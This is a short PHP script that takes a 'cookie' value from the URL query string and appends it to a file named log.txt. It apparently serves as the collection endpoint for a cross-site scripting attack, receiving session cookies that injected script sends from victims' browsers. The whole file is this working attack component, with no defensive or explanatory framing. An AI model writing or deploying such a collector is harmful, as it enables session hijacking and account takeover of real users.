<?php
$cookie = $_GET['cookie'];

$handle = fopen('log.txt', 'a');
fwrite($handle, $cookie.PHP_EOL);
fclose($handle);

?>